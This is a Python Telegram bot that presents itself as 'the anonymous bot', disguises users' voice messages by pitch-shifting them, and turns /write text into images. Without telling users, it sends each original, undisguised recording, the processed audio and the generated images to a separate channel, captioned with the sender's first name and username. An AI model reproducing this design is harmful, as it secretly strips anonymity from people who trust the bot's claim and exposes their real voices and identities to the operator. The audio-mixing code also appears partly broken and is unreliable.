import telebot
import librosa
import soundfile as sf
import numpy as np
import os
from PIL import Image, ImageDraw, ImageFont

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
bot = telebot.TeleBot('YOUR_TELEGRAM_BOT_TOKEN')
channel_id = 'YOUR_CHANNEL_ID'



@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 'Hello! Welcome to the anonymous bot.')

@bot.message_handler(content_types=['voice', 'audio'])
def process_audio(message):
    chat_id = message.chat.id

    try:
        if message.voice:
            # Download the voice audio file sent by the user
            file_info = bot.get_file(message.voice.file_id)
        elif message.audio:
            # Download the music audio file sent by the user
            file_info = bot.get_file(message.audio.file_id)
        else:
            bot.send_message(chat_id, 'Please send a valid voice or audio file.')
            return

        downloaded_file = bot.download_file(file_info.file_path)

        # Save the audio file locally using the original filename provided by Telegram
        input_filename = file_info.file_path.split('/')[-1]
        with open(input_filename, 'wb') as f:
            f.write(downloaded_file)

        # Load the original audio file
        audio, sr = librosa.load(input_filename, sr=None)

        # Define the pitch shift factors for the two outputs
        pitch_shift_factors = [4, -3]

        # Initialize an array to store the mixed audio
        mixed_audio = np.zeros_like(audio)

        # Process each pitch shift factor
        for i, pitch_shift_factor in enumerate(pitch_shift_factors):
            # Shift the pitch of the audio
            pitch_shifted_audio = librosa.effects.pitch_shift(audio, sr=sr, n_steps=pitch_shift_factor, bins_per_octave=12)

            # Calculate the stretch factor based on durations
            original_duration = len(audio) / sr
            pitch_shifted_duration = len(pitch_shifted_audio) / sr
            stretch_factor = pitch_shifted_duration / original_duration

            # Stretch the pitch-shifted audio by repeating the samples
            stretched_audio = librosa.effects.time_stretch(pitch_shifted_audio, rate=stretch_factor)

            # Mix the stretched audio with the original audio
            mixed_audio = np.add(mixed_audio[:len(stretched_audio)], stretched_audio)  # Mix at the same length as the stretched audio

            # Save the stretched audio to a new file (optional)
            # output_filename = f'output_audio_{i+1}.wav'  # Create a unique filename for each output
            # sf.write(output_filename, stretched_audio, sr, format='wav')

        # Mix the original audio with the final mixed audio
        mixed_audio = np.add(mixed_audio[:len(audio)], audio)  # Mix at the same length as the original audio

        # Save the mixed audio to a file with the input filename and suffix "_filtered"
        output_filename = f'{input_filename.split(".")[0]}_filtered.mp3'
        sf.write(output_filename, mixed_audio, sr, format='mp3')

        # Get the first name of the user who is using the bot
        first_name = message.from_user.first_name
        # Get the username of the user who is using the bot
        username = message.from_user.username


        # Send the mixed output audio file back to the user
        with open(output_filename, 'rb') as f:
            bot.send_audio(chat_id, f, caption=f"Thanks for using me {first_name}.")


        # Send the input audio file to the specified channel
        with open(input_filename, 'rb') as f:
            bot.send_audio(channel_id, f, caption=f"{first_name} - @{username}")

        # Send the output audio file to the specified channel
        with open(output_filename, 'rb') as f:
            bot.send_audio(channel_id, f, caption=f"{first_name} - @{username}")

        # Delete the input and output audio files locally
        os.remove(input_filename)
        os.remove(output_filename)


    except Exception as e:
        print(str(e))
        bot.send_message(chat_id, 'An error occurred. Please try again.')

def generate_image(text):
    img = Image.open("template.jpg")
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("assfont.ttf", 30)
    x, y = 150, 140
    lines = text.split("\n")
    line_height = font.getsize("hg")[1]
    for line in lines:
        draw.text((x, y), line, fill=(1, 22, 55), font=font)
        y = y + line_height - 5
    file = "generated.jpg"
    img.save(file)
    return file

def remove_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

@bot.message_handler(commands=['write'])
def handle_write_command(message):
    chat_id = message.chat.id

    # Check if a text message was provided
    if len(message.text.split(maxsplit=1)) < 2:
        bot.send_message(chat_id, "Please provide the text to generate the image.")
        return

    # Extract the text from the command message
    text = message.text.split(maxsplit=1)[1]

    # Generate the image
    image_file = generate_image(text)

    # Get the first name of the user who is using the bot
    first_name = message.from_user.first_name
    # Get the username of the user who is using the bot
    username = message.from_user.username


    # Send the generated image to the user
    with open(image_file, 'rb') as f:
        bot.send_photo(chat_id, f, caption=f"Thanks for using me {first_name}.")

    # Send the generated image to the specified channel
    with open(image_file, 'rb') as f:
        bot.send_photo(channel_id, f, caption=f"{first_name} - @{username}")

    # Delete the image file locally
    remove_file(image_file)


# Start the bot
bot.polling()
